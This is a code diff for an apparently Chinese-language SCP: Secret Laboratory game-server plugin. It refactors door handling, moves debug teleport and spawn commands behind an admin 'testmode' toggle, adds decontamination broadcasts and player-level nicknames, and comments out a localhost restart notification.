@@ -3,6 +3,7 @@ using Exiled.API.Extensions;
 using Exiled.API.Features;
 using Exiled.Events.EventArgs;
 using Hints;
+using Interactables.Interobjects.DoorUtils;
 using MEC;
 using Mirror;
 using Newtonsoft.Json;
@@ -10,6 +11,7 @@ using Respawning;
 using Respawning.NamingRules;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -24,33 +26,17 @@ namespace YYYLike
 	public class EventHandlers
 	{
 		public string url = "http://127.0.0.1:4578/";
-
 		private bool h;
-
 		private bool choise;
-
 		private Exiled.API.Features.Player scp;
-
 		private bool die;
-
 		private bool start;
-
 		private int int222;
-
 		public List<string> scp_999 = new List<string>();
-
-		public int s049;
-
-		private int KillerID;
 		private Player 黑暗掌控者;
 		private int 黑暗掌控者id;
 		private bool 黑暗掌控者yes;
-		private int PlayerID;
-		List<Vector3> vector3s = new List<Vector3>();
 		public bool roundstart = false;
-		List<int> scp881xiaoid = new List<int>();
-		List<int> scp881daid = new List<int>();
-
 		public int[] GuardType = new int[200];
 
 		public int Guardnum = 0;
@@ -100,7 +86,8 @@ namespace YYYLike
 		private bool coldwait233;
 
 		private bool Dio1;
-
+		private Exiled.API.Features.Player Dio;
+		private List<string> Dio2 = new List<string>();
 		private bool sjtz1;
 
 		private bool sjtz2;
@@ -147,21 +134,16 @@ namespace YYYLike
 
 		private Exiled.API.Features.Player cxk;
 
-		public bool cxkyes;
 		public List<Pickup> Baba = new List<Pickup>();
 		public List<Pickup> Baba1 = new List<Pickup>();
 		public List<int> scp881id = new List<int>();
-		
+
 		public List<int> 第一次 = new List<int>();
 		public List<int> 第二次 = new List<int>();
 		private bool cxkflash;
-
+		public bool cxkyes;
 		public int cxkid;
-
-		public bool jntm;
-
 		public int scp817id;
-
 		private Exiled.API.Features.Player scp817;
 
 		public bool scp817yes;
@@ -174,6 +156,7 @@ namespace YYYLike
 
 		public int times1 = 0;
 
+		public bool jntm;
 		public bool jntmlq;
 
 		private Exiled.API.Features.Player scp2006;
@@ -189,17 +172,11 @@ namespace YYYLike
 		private int times5 = 1;
 
 		private int scpqblid2;
-
 		private Exiled.API.Features.Player scpqbl;
-
 		private string scpqblid;
-
 		private bool qblcq2;
-
 		private int scp914mid;
-
 		private int scp939id;
-
 		private bool jkl;
 
 		private string jklid;
@@ -276,9 +253,8 @@ namespace YYYLike
 
 		public List<int> sbxd = new List<int>();
 
-		public List<Exiled.API.Features.Player> player_list;
+		public List<Exiled.API.Features.Player> player_list = new List<Player>();
 		public List<string> Firstadmin = new List<string>();
-		
 		public List<CoroutineHandle> Coroutines = new List<CoroutineHandle>();
 		public List<Player> gongpingliaotian = new List<Player>();
 
@@ -311,8 +287,7 @@ namespace YYYLike
 
 		private Vector3 D9341zb;
 		private List<ItemType> scp738item = new List<ItemType>();
-		
-		private List<string> Dio2 = new List<string>();
+
 
 		private Exiled.API.Features.Player scpqbl3;
 
@@ -322,17 +297,13 @@ namespace YYYLike
 
 		private List<int> LLBS233 = new List<int>();
 
-		private List<Door> door2 = new List<Door>();
+		private List<DoorVariant> door2 = new List<DoorVariant>();
 
 		private List<string> scp682 = new List<string>();
-
 		private List<string> ylb2 = new List<string>();
-
 		private List<int> bpb2 = new List<int>();
-
 		private Exiled.API.Features.Player scp2818;
 
-		private Exiled.API.Features.Player Dio;
 
 		private List<Vector3> pos1 = new List<Vector3>();
 
@@ -480,19 +451,10 @@ namespace YYYLike
 		private int g;
 
 		private bool kccd;
-
-		private string sendtxt;
-
-		private object sendtxt6;
-
-		private object sendtxt5;
-
-		private object sendtxt4;
-
-		private object sendtxt3;
-
-		private string sendtxt2;
 		private List<ItemType> D9341Item = new List<ItemType>();
+		private List<string> scpchat = new List<string>();
+		private List<string> ntfchat = new List<string>();
+		private List<string> chichat = new List<string>();
 
 		private bool dq;
 
@@ -520,7 +482,7 @@ namespace YYYLike
 		private int bssyid;
 		private bool busishenyaoyes;
 		private int scp173cps;
-		private Pickup cjxb;
+		private Pickup cjxb = null;
 		private int cjxbid;
 		private bool shutdowncde;
 		private bool shutdownyes;
@@ -540,46 +502,36 @@ namespace YYYLike
 		private float scp93989dis;
 		private Player scp3999;
 		private int scp3999id;
-		private Thread Timing223;
 		private bool crowbaryes;
 		private int crowbarid;
+		private int caidanqiangid;
+		private Pickup caidanqiang;
+        private bool testmode;
+        private Thread thread;
 
-		private IEnumerator<float> SetPlayerScale(GameObject target, float x, float y, float z)
+        public static void setnick(ReferenceHub hub)
 		{
-			yield return Timing.WaitForSeconds(0.1f);
+			int exp = IniFile.ReadExp(hub.characterClassManager.UserId);
+			int Lv = IniFile.ReadLevel(exp);
+			if (!hub.serverRoles.GlobalSet)
+				hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + "]" + hub.nicknameSync.Network_myNickSync;
 
-			try
-			{
-				NetworkIdentity identity = target.GetComponent<NetworkIdentity>();
-				target.transform.localScale = new Vector3(1 * x, 1 * y, 1 * z);
-
-				ObjectDestroyMessage destroyMessage = new ObjectDestroyMessage();
-				destroyMessage.netId = identity.netId;
-
-				foreach (GameObject player in PlayerManager.players)
-				{
-					NetworkConnection playerCon = player.GetComponent<NetworkIdentity>().connectionToClient;
-					if (player != target)
-						playerCon.Send(destroyMessage, 0);
-
-					object[] parameters = new object[] { identity, playerCon };
-					typeof(NetworkServer).InvokeStaticMethod("SendSpawnMessage", parameters);
-				}
-			}
-			catch (Exception e)
-			{
-				Log.Info($"设置失败: {e}");
-			}
 		}
+		public static void setnick(ReferenceHub hub, int exp)
+		{
+			int Lv = IniFile.ReadLevel(exp);
+			if (!hub.serverRoles.GlobalSet)
+				hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + "]" + hub.nicknameSync.Network_myNickSync;
 
-		private IEnumerator<float> HurtPepale(Player player,float Ammo)
+		}
+		private IEnumerator<float> HurtPepale(Player player, float Ammo)
 		{
 			yield return Timing.WaitForSeconds(0.1f);
 			float Ammo2 = Ammo;
 
-			if (player.AdrenalineHealth >0)
+			if (player.AdrenalineHealth > 0)
 			{
-				if(player.AdrenalineHealth >= Ammo)
+				if (player.AdrenalineHealth >= Ammo)
 				{
 					player.AdrenalineHealth -= player.AdrenalineHealth;
 					Ammo2 = 0;
@@ -625,7 +577,7 @@ namespace YYYLike
 					break;
 				}
 			}
-			if(ev.Player.Id == scp550id)
+			if (ev.Player.Id == scp550id)
 			{
 				ev.IsAllowed = false;
 			}
@@ -637,6 +589,35 @@ namespace YYYLike
 			yield return Timing.WaitForSeconds(200f);
 			shutdowncde = false;
 		}
+		#region "调整人物大小方法"
+		public IEnumerator<float> SetPlayerScale(GameObject target, float x, float y, float z)
+		{
+			yield return Timing.WaitForSeconds(1f);
+
+			try
+			{
+				NetworkIdentity identity = target.GetComponent<NetworkIdentity>();
+				target.transform.localScale = new Vector3(1 * x, 1 * y, 1 * z);
+
+				ObjectDestroyMessage destroyMessage = new ObjectDestroyMessage();
+				destroyMessage.netId = identity.netId;
+
+				foreach (GameObject player in PlayerManager.players)
+				{
+					NetworkConnection playerCon = player.GetComponent<NetworkIdentity>().connectionToClient;
+					if (player != target)
+						playerCon.Send(destroyMessage, 0);
+
+					object[] parameters = new object[] { identity, playerCon };
+					typeof(NetworkServer).InvokeStaticMethod("SendSpawnMessage", parameters);
+				}
+			}
+			catch (Exception e)
+			{
+				Log.Info($"Set Scale error: {e}");
+			}
+		}
+		#endregion
 
 		private IEnumerator<float> ShouLei(Vector3 vector3)
 		{
@@ -651,15 +632,15 @@ namespace YYYLike
 			StreamReader sr = new StreamReader("D:\\\\test\\\\" + txtweizhi + ".txt");
 			yield return Timing.WaitForSeconds(6f);
 			string temp = sr.ReadToEnd();
-			if(txtweizhi == "mvp")
+			if (txtweizhi == "mvp")
 			{
 				temp = temp.Replace("{MVPName}", mvpplayer.Nickname);
 				temp = temp.Replace("{MVPValue}", mvp[mvpplayer.Id].ToString());
-				for(int i = 0; i<= 5; i++)
+				for (int i = 0; i <= 5; i++)
 				{
 					foreach (Player player1 in Player.List)
 					{
-						player1.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1] { new StringHintParameter("") }));
+						player1.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1] { new StringHintParameter("") },null,10));
 					}
 					yield return Timing.WaitForSeconds(1f);
 				}
@@ -669,37 +650,8 @@ namespace YYYLike
 				player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1]
 				{
 				new StringHintParameter("")
-				}));
-				yield return Timing.WaitForSeconds(1f);
-				player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1]
-				{
-				new StringHintParameter("")
-				}));
-				yield return Timing.WaitForSeconds(1f);
-				player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1]
-				{
-				new StringHintParameter("")
-				}));
-				yield return Timing.WaitForSeconds(1f);
-				player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1]
-				{
-				new StringHintParameter("")
-				}));
-				yield return Timing.WaitForSeconds(1f);
-				player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1]
-				{
-				new StringHintParameter("")
-				}));
-				yield return Timing.WaitForSeconds(1f);
-				player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1]
-				{
-				new StringHintParameter("")
-				}));
-				yield return Timing.WaitForSeconds(1f);
-				player.ReferenceHub.hints.Show(new TextHint(temp, new HintParameter[1]
-				{
-				new StringHintParameter("")
-				}));
+				},null,10));
+				yield return Timing.WaitForSeconds(10f);
 				if (txtweizhi == "scp650")
 				{
 					scp650.Health = 1f;
@@ -714,7 +666,7 @@ namespace YYYLike
 			mvp.Clear();
 			mvpplayer = null;
 			mvpplayerid = 0;
-			Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+/*			Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 			if (Server.Port == 7777)
 			{
 				tcp.Connect("127.0.0.1", 12344);
@@ -724,47 +676,156 @@ namespace YYYLike
 			{
 				tcp.Connect("127.0.0.1", 12345);
 				tcp.Send(Encoding.UTF8.GetBytes("7778需要重启服务器了"));
-			}
+			}*/
 
 		}
 		public void OnUpgradingItems(UpgradingItemsEventArgs ev)
 		{
-			foreach(Pickup pickup in ev.Items)
+			foreach (Pickup pickup in ev.Items)
 			{
-				if(pickup.ItemId == ItemType.Medkit && cjxb == null)
+				if (pickup.ItemId == ItemType.Medkit && cjxb == null)
 				{
 					int awa = new System.Random().Next(1, 100);
-					if (awa>=95)
+					if (awa >= 95)
 					{
 						cjxb = pickup;
 					}
 				}
 			}
 		}
+		public void OnAnnouncingDecontamination(AnnouncingDecontaminationEventArgs ev)
+		{
+			switch (ev.Id)
+			{
+				case 0:
+					Map.Broadcast(10, "----[<color=#ff99ff>系统提示</color>]----\n<i>轻收容净化还剩15分钟进行</i>.", 0);
+					return;
+				case 1:
+					Map.Broadcast(10, "----[<color=#ff66ff>系统提示</color>]----\n<i>轻收容净化还剩10分钟进行</i>.", 0);
+					return;
+				case 2:
+					Map.Broadcast(10, "----[<color=#ff00ff>系统提示</color>]----\n<i>轻收容净化还剩5分钟进行</i>.", 0);
+					return;
+				case 3:
+					Map.Broadcast(10, "----[<color=#ff3333>系统提示</color>]----\n<i>轻收容净化还剩1分钟进行</i>.", 0);
+					return;
+				case 4:
+					Map.Broadcast(10, "----[<color=#ff0000>系统提示</color>]----\n<i>轻收容净化还剩30秒钟进行</i>.", 0);
+					return;
+				default:
+					return;
+			}
+		}
 		public void OnRemoteAdminCommand(SendingRemoteAdminCommandEventArgs ev)
 		{
-			if(ev.Name == "testtpdoor")
-			{
-				foreach(Door door in Map.Doors)
-				{
-					if(door.DoorName.Contains(ev.Arguments[0]))
-					{
-						ev.Sender.Position = door.localPos;
-					}
-					 
+			if(ev.Name == "testmode")
+            {
+				if(testmode)
+                {
+					testmode = true;
+					ev.ReplyMessage = "调试模式开启成功";
+					ev.ReplyMessage = "指令列表\nbadappledonotuse\nxiangjiaojundonotuse\ncxkdonotuse\ngetdoors\ngetrooms\ngetrole\ntpdoor\ntproom\nhedan\nhedanoff\ncxk\nhinttest";
+
 				}
-				
-			}
-			if (ev.Name == "testtproom")
-			{
-				foreach (Room door in Map.Rooms)
+                else
+                {
+					ev.ReplyMessage = "调试模式关闭完成";
+					testmode = false;
+                }
+            }
+			if(testmode)
+            {
+				if (ev.Name.Contains("badappledonotuse"))
 				{
-					if (door.Name.Contains(ev.Arguments[0]))
+					Coroutines.Add(Timing.RunCoroutine(Badapple("txt")));
+				}
+				if (ev.Name.Contains("xiangjiaojundonotuse"))
+				{
+					Coroutines.Add(Timing.RunCoroutine(Badapple("xiangjiaojuntxt")));
+				}
+				if (ev.Name.Contains("cxkdonotuse"))
+				{
+					Coroutines.Add(Timing.RunCoroutine(Badapple("cxktxt")));
+				}
+				if (ev.Name == "getdoors")
+				{
+
+					foreach (DoorVariant room in Map.Doors)
 					{
-						ev.Sender.Position = door.Position;
+						Stopwatch timer = new Stopwatch();
+						timer.Start();
+						try
+						{
+							Log.Info(room.GetComponent<DoorNametagExtension>().GetName);
+						}
+						catch
+						{
+
+						}
+						timer.Stop();
+						Log.Info(timer.Elapsed.TotalMilliseconds);
 					}
 				}
+				if (ev.Name == "getrooms")
+				{
+					foreach (Room room in Map.Rooms)
+					{
+						Log.Info(room.Name);
+					}
+				}
+				if (ev.Name == "getrole")
+				{
+					ev.ReplyMessage = ev.Sender.Role.ToString();
+				}
+				if (ev.Name == "tpdoor")
+				{
+					foreach (DoorVariant door in Map.Doors)
+					{
+						door.TryGetComponent(out DoorNametagExtension doortag);
+						if (doortag.GetName.Contains(ev.Arguments[0]))
+						{
+							ev.Sender.Position = door.transform.position;
+						}
+					}
+
+				}
+				if (ev.Name == "tproom")
+				{
+					foreach (Room door in Map.Rooms)
+					{
+						if (door.Name.Contains(ev.Arguments[0]))
+						{
+							ev.Sender.Position = door.Position;
+						}
+					}
+				}
+				if (ev.Name == "hedan")
+				{
+					shoulei = true;
+					Timing.RunCoroutine(ShouLei(ev.Sender.Position));
+				}
+				if (ev.Name == "hedanoff")
+				{
+					if (shoulei)
+					{
+						shoulei = false;
+					}
+					else
+					{
+						shoulei = true;
+					}
+				}
+				if (ev.Name == "cxk")
+				{
+					Timing.RunCoroutine(Badapple("cxktxt"));
+				}
+				if (ev.Name == "hinttest")
+				{
+					Timing.RunCoroutine(testHint("测试", ev.Sender));
+				}
+
 			}
+
 			foreach (Exiled.API.Features.Player referenceHub in Exiled.API.Features.Player.List)
 			{
 				if (ev.Arguments.Count == 1)
@@ -785,98 +846,6 @@ namespace YYYLike
 						new StringHintParameter("")
 					}));
 				}
-			}
-			if(ev.Name == "getscp")
-			{
-				if(ev.Arguments[0] == "d9341")
-				{
-					D9341 = ev.Sender;
-					D9341js = RoleType.ClassD;
-					D9341id = D9341.Id;
-					D9341zb = D9341.Position;
-					d9341flash = true;
-					Setrank_new("D-9341", "red", D9341);
-					D9341.Broadcast(6, "你是[<color=red>D-9341</color>]<color=lime>你有存档能力 丢掉闪光弹</color><color=red>(打开背包右键不是左键扔出去)</color><color=lime>存档</color>\n<color=lime>死亡或丢手电会回档一共5次机会</color>");
-					Timing.RunCoroutine(testHint("d9341", D9341));
-				}
-			}
-			if (ev.Name == "hurtmeplz")
-			{
-				ev.Sender.ReferenceHub.playerStats.HurtPlayer(new PlayerStats.HitInfo(99f, "服务器", DamageTypes.E11StandardRifle, 0), ev.Sender.GameObject);
-			}
-			if (ev.Name == "csgo")
-			{
-				End();
-				csgo csgo = new csgo();
-				Exiled.Events.Handlers.Scp914.UpgradingItems -= OnUpgradingItems;
-
-				Exiled.Events.Handlers.Server.WaitingForPlayers -= OnWaitingForPlayers;
-				Exiled.Events.Handlers.Server.RoundStarted -= OnRoundStart;
-				Exiled.Events.Handlers.Server.RoundEnded -= OnRoundEnd;
-				Exiled.Events.Handlers.Player.Joined -= OnPlayerJoin;
-				Exiled.Events.Handlers.Player.Died -= OnPlayerDeath;
-				Exiled.Events.Handlers.Player.MedicalItemUsed -= OnMedicalItem;
-				Exiled.Events.Handlers.Server.RespawningTeam -= OnTeamRespawn;
-				Exiled.Events.Handlers.Server.SendingConsoleCommand -= OnConsoleCommand;
-				Exiled.Events.Handlers.Player.FailingEscapePocketDimension -= OnPocketDimDeath;
-				Exiled.Events.Handlers.Player.Escaping -= OnCheckEscape;
-				Exiled.Events.Handlers.Player.InteractingDoor -= OnDoorInteract;
-				Exiled.Events.Handlers.Scp106.Containing -= OnScp106Contain;
-				Exiled.Events.Handlers.Server.EndingRound -= OnCheckRoundEnd;
-				Exiled.Events.Handlers.Player.DroppingItem -= OnDropItem;
-				Exiled.Events.Handlers.Player.Shooting -= OnShoot;
-				Exiled.Events.Handlers.Player.PickingUpItem -= OnPickupItem;
-				Exiled.Events.Handlers.Player.Hurting -= OnPlayerHurt;
-				Exiled.Events.Handlers.Player.EscapingPocketDimension -= OnPocketDimEscaped;
-				Exiled.Events.Handlers.Player.ChangingRole -= OnSetClass;
-				Exiled.Events.Handlers.Player.Spawning -= OnPlayerSpawn;
-				Exiled.Events.Handlers.Scp079.GainingLevel -= OnScp079LvlGain;
-				Exiled.Events.Handlers.Player.UnlockingGenerator -= OnGeneratorUnlock;
-				Exiled.Events.Handlers.Player.Left -= OnPlayerLeave;
-				Exiled.Events.Handlers.Warhead.Stopping -= ONWarheadCancelled;
-				Exiled.Events.Handlers.Scp914.ChangingKnobSetting -= On914KnobChange;
-				Exiled.Events.Handlers.Scp096.Enraging -= OnScp096Enrage;
-				Exiled.Events.Handlers.Warhead.Detonated -= OnWarheadDetonation;
-				Exiled.Events.Handlers.Server.SendingRemoteAdminCommand -= OnRemoteAdminCommand;
-				Exiled.Events.Handlers.Map.Decontaminating -= OnDecontaminate;
-				Exiled.Events.Handlers.Player.Dying -= OnDying;
-				Exiled.Events.Handlers.Server.RestartingRound += OnRestartingRound;
-				Exiled.Events.Handlers.Warhead.Starting -= ONWarheadStarter;
-				Exiled.Events.Handlers.Player.TriggeringTesla -= OnTriggeringTesla;
-
-				Exiled.Events.Handlers.Server.RoundStarted += csgo.OnRoundStart;
-				Exiled.Events.Handlers.Server.EndingRound += csgo.OnEnding;
-				Exiled.Events.Handlers.Server.RoundEnded += csgo.OnRoundEnd;
-				Exiled.Events.Handlers.Player.ChangingItem += csgo.OnPlayerChangeItem;
-
-
-
-
-
-			}
-			if (ev.Name == "hd")
-			{
-				shoulei = true;
-				Timing.RunCoroutine(ShouLei(ev.Sender.Position));
-			}
-			if (ev.Name == "hd2")
-			{
-				if (shoulei)
-				{
-					shoulei = false;
-				}
-				else
-				{
-					shoulei = true;
-				}
-			}
-			if (ev.Name == "test")
-			{
-				Timing.RunCoroutine(Badapple("cxktxt"));
-			}
-			if (ev.Name == "test6")
-			{
-				Timing.RunCoroutine(testHint("测试", ev.Sender));
 			}
 			if (ev.Name == "clean")
 			{
@@ -944,13 +913,10 @@ namespace YYYLike
 		{
 			Exiled.API.Features.Map.Broadcast(10, "<color=red>[警告]</color>\n<color=lime>地表核弹即将开启 开启后将会消灭全部 SCP和人类</color>");
 			Coroutines.Add(Timing.RunCoroutine(Dbhd()));
-			Coroutines.Add(Timing.RunCoroutine(Whereareyou()));
-
-
 		}
 		public void OnTriggeringTesla(TriggeringTeslaEventArgs ev)
 		{
-			if(shutdownyes)
+			if (shutdownyes)
 			{
 				ev.IsTriggerable = false;
 			}
@@ -969,45 +935,6 @@ namespace YYYLike
 				}
 			}
 		}
-		private IEnumerator<float> Whereareyou()
-		{
-			while (true)
-			{
-				yield return Timing.WaitForSeconds(40f);
-				foreach (Exiled.API.Features.Player player in Exiled.API.Features.Player.List)
-				{
-					if (!(player.Position.y >= 950f) || !(player.Position.y <= 1030f))
-					{
-						player.Broadcast(5, "你为什么在这里回去玩游戏=w=");
-						player.Kill(DamageTypes.Nuke);
-						player.SetRole(RoleType.Spectator);
-					}
-					if(player.Role == RoleType.Scp079)
-                    {
-						player.Kill(DamageTypes.Nuke);
-						player.Role = RoleType.Spectator;
-                    }
-				}
-			}
-		}
-
-		private IEnumerator<float> Whereareyou2()
-		{
-			while (true)
-			{
-				yield return Timing.WaitForSeconds(40f);
-				foreach (Exiled.API.Features.Player player in Exiled.API.Features.Player.List)
-				{
-					if (player.Position.y >= -9f && player.Position.y <= 20f)
-					{
-						player.Broadcast(5, "你为什么在这里回去玩游戏=w=");
-						player.Kill(DamageTypes.Nuke);
-						player.SetRole(RoleType.Spectator);
-					}
-				}
-			}
-		}
-
 		private IEnumerator<float> Dbhd()
 		{
 			yield return Timing.WaitForSeconds(480f);
@@ -1030,19 +957,15 @@ namespace YYYLike
 
 		public void OnWaitingForPlayers()
 		{
-			pmdon = true;
-			Coroutines.Add(Timing.RunCoroutine(PMD()));
-			foreach (Room room in Map.Rooms)
-			{
-				Log.Info(room.Name);
-			}
 
-			Coroutines.Add(Timing.RunCoroutine(SecondCounter()));
+			pmdon = true;
+			Timing.RunCoroutine(PMD());
+
+			Log.Info("为了优化性能已将调试代码移植AdminCommand");
 			Coroutines.Add(Timing.RunCoroutine(SecondCounter2()));
 		}
 		public IEnumerator<float> PMD()
 		{
-
 			Log.Info("PMD线程初始化");
 			int pmdjsq = 0;
 			int pmdawa = 0;
@@ -1054,6 +977,7 @@ namespace YYYLike
 			int lajiqingli = 0;
 			int xunhuan5 = 0;
 			int xunhuanawa = 0;
+			int xunhuantestex = 0;
 			while (pmdon)
 			{
 				xunhuan5++;
@@ -1063,6 +987,37 @@ namespace YYYLike
 				lajiqingli++;
 				xunhuanawa++;
 				guangboshi++;
+				xunhuantestex++;
+				if (csm)
+				{
+					csmtime++;
+					if (csmtime == 10)
+					{
+						csm = false;
+						csmtime = 0;
+					}
+				}
+				if (starttimer)
+				{
+					if (coldbc)
+					{
+						coldtime++;
+						if (coldtime == 80)
+						{
+							coldbc = false;
+							coldtime = 0;
+						}
+					}
+					if (coldtb)
+					{
+						coldtime2++;
+						if (coldtime2 == 300)
+						{
+							coldtb = false;
+							coldtime = 0;
+						}
+					}
+				}
 				try
 				{
 					if (!roundstart)
@@ -1133,7 +1088,11 @@ namespace YYYLike
 					Log.Info("错误，称号");
 				}
 
-
+				if(xunhuantestex >= 100)
+                {
+					xunhuantestex = 0;
+					Log.Info("PMD线程运行正常");
+                }
 				if (xunhuanawa >= 20)
 				{
 
@@ -1175,7 +1134,7 @@ namespace YYYLike
 								scp457sh = 0;
 								foreach (Inventory.SyncItemInfo syncItemInfo in scp457.Inventory.items)
 								{
-									if (syncItemInfo.id.IsSCP())
+									if (syncItemInfo.id.IsScp())
 									{
 										scp457sh++;
 									}
@@ -1397,7 +1356,6 @@ namespace YYYLike
 					}
 				}
 				yield return Timing.WaitForSeconds(1f);
-
 			}
 			Log.Info("PMD线程结束运行");
 		}
@@ -1501,9 +1459,9 @@ namespace YYYLike
 		}
 		private IEnumerator<float> ZhanYan()
 		{
-			for(int i = 0; i<=10;i++)
+			for (int i = 0; i <= 10; i++)
 			{
-				foreach(Player player in Player.List)
+				foreach (Player player in Player.List)
 				{
 					yield return Timing.WaitForSeconds(1f);
 					player.GameObject.GetComponent<WeaponCamera>().gameObject.SetActive(false);
@@ -1673,6 +1631,8 @@ namespace YYYLike
 					}
 					s++;
 				}
+				caidanqiang = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.GunCOM15, 0f, RoleType.ClassD.GetRandomSpawnPoint(), Quaternion.identity, 0, 0, 0);
+
 				if (referenceHub.Role == RoleType.FacilityGuard)
 				{
 					if (g == 0 && scp999yes)
@@ -1689,7 +1649,7 @@ namespace YYYLike
 
 						Timing.RunCoroutine(testHint("gjba", referenceHub));
 					}
-					if(g == 2)
+					if (g == 2)
 					{
 						黑暗掌控者 = referenceHub;
 						黑暗掌控者id = referenceHub.Id;
@@ -1700,7 +1660,7 @@ namespace YYYLike
 						Timing.RunCoroutine(HeiGive());
 						referenceHub.AddItem(ItemType.Coin);
 						referenceHub.Broadcast(10, "<color=lime>[SCP134]</color>\n<color=yello>SCP阵营</color>\n<color=yellow>丢下硬币可以让设施停电</color>");
-						Timing.RunCoroutine(Tp(referenceHub, RoleType.Scp173.GetRandomSpawnPoint()));;
+						Timing.RunCoroutine(Tp(referenceHub, RoleType.Scp173.GetRandomSpawnPoint())); ;
 					}
 					g++;
 				}
@@ -1780,74 +1740,82 @@ namespace YYYLike
 				{
 					if (Player.List.Count() <= 30)
 					{
-						Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 1400)));
+						Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 1400));
 					}
 					else
 					{
-						Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 2300)));
+						Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 2300));
 
 					}
 				}
 				if (referenceHub.Role == RoleType.Scp173 && referenceHub.Id != scp650id)
 				{
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 4200)));
+					Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 4200));
 				}
 				if (referenceHub.Role == RoleType.Scp049)
 				{
 					if (Player.List.Count() <= 30)
 					{
-						Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 3200)));
+						Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 3200));
 					}
 					else
 					{
-						Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 3800)));
+						Timing.RunCoroutine(RunRestoreMaxHp(referenceHub, 3800));
 
 					}
 				}
 			}
-			foreach (Door door in UnityEngine.Object.FindObjectsOfType<Door>())
+			foreach (DoorVariant door in UnityEngine.Object.FindObjectsOfType<DoorVariant>())
 			{
-				if (door.DoorName.Contains("096"))
-				{
-					for (int c = 0; c <= 30; c++)
+                try
+                {
+					if (door.GetComponent<DoorNametagExtension>().GetName.Contains("096"))
 					{
-						Pickup test = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.Coin, 0f, new Vector3(door.transform.position.x, door.transform.position.y + 5f, door.transform.position.z), Quaternion.identity, 0, 0, 0);
-						if (c == 1)
-							Baba1.Add(test);
-						if (c == 13)
-							Baba1.Add(test);
-						if (c == 7)
-							Baba1.Add(test);
-						if (c == 18)
-							Baba1.Add(test);
-						if (c == 22)
-							Baba1.Add(test);
-						if (c == 26)
-							Baba1.Add(test);
-						if (c == 30)
-							Baba1.Add(test);
-						if (c == 11)
-							Baba1.Add(test);
-						if (c == 24)
-							Baba1.Add(test);
-						if (c == 28)
-							Baba1.Add(test);
-						if (c == 3)
-							Baba1.Add(test);
-						if (c == 5)
-							Baba1.Add(test);
-						if (c == 9)
-							Baba1.Add(test);
-						if (c == 15)
-							Baba1.Add(test);
-						if (c == 17)
-							Baba1.Add(test);
-						if (!Baba1.Contains(test))
+						for (int c = 0; c <= 30; c++)
 						{
-							Baba.Add(test);
+							Pickup test = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.Coin, 0f, new Vector3(door.transform.position.x, door.transform.position.y + 5f, door.transform.position.z), Quaternion.identity, 0, 0, 0);
+							if (c == 1)
+								Baba1.Add(test);
+							if (c == 13)
+								Baba1.Add(test);
+							if (c == 7)
+								Baba1.Add(test);
+							if (c == 18)
+								Baba1.Add(test);
+							if (c == 22)
+								Baba1.Add(test);
+							if (c == 26)
+								Baba1.Add(test);
+							if (c == 30)
+								Baba1.Add(test);
+							if (c == 11)
+								Baba1.Add(test);
+							if (c == 24)
+								Baba1.Add(test);
+							if (c == 28)
+								Baba1.Add(test);
+							if (c == 3)
+								Baba1.Add(test);
+							if (c == 5)
+								Baba1.Add(test);
+							if (c == 9)
+								Baba1.Add(test);
+							if (c == 15)
+								Baba1.Add(test);
+							if (c == 17)
+								Baba1.Add(test);
+							if (!Baba1.Contains(test))
+							{
+								Baba.Add(test);
+							}
 						}
 					}
 				}
+                catch
+                {
+
+                }
+
 			}
 			for (int c2 = 0; c2 <= 30; c2++)
 			{
@@ -1940,26 +1908,27 @@ namespace YYYLike
 			}
 			yield return Timing.WaitForSeconds(200f);
 			int time = 0;
-			foreach(Player player1 in Player.List)
+			foreach (Player player1 in Player.List)
 			{
-				if(player1.Role == RoleType.Spectator)
+				if (player1.Role == RoleType.Spectator)
 				{
 					player1.Role = RoleType.ClassD;
-					foreach(Room room in Map.Rooms)
+					foreach (Room room in Map.Rooms)
 					{
-						if(room.Name.Contains("EZ_Shelter") == false)
+						if (room.Name.Contains("EZ_Shelter") == false)
 						{
-							player1.Position = room.Position + Vector3.up ;
+							player1.Position = room.Position + Vector3.up;
 						}
 					}
 					scp881id.Add(player1.Id);
 					Setrank_new("SCP881", "yellow", player1);
 					player1.Broadcast(10, "<color=lime>[SCP881]</color>\n<color=yello>小人</color>\n<color=yellow>你的伤害很低，D级阵营</color>");
-					scp881xiaoid.Add(player1.Id);
-
+					Timing.RunCoroutine(SetPlayerScale(player1.GameObject, 0.6f, 0.6f, 0.6f));
 					time++;
+					yield return Timing.WaitForSeconds(1f);
+
 				}
-				if(time >=4)
+				if (time >= 4)
 				{
 					break;
 				}
@@ -1989,7 +1958,7 @@ namespace YYYLike
 					lbv.AddItem(ItemType.Coin);
 					Map.Broadcast(5, "伞兵一号lbv准备就绪");
 					Setrank_new("卢本伟", "red", lbv);
-					lbv.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Visuals939>(400, true);
+					lbv.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Visuals939>(1200, true);
 
 					continue;
 				}
@@ -2030,7 +1999,7 @@ namespace YYYLike
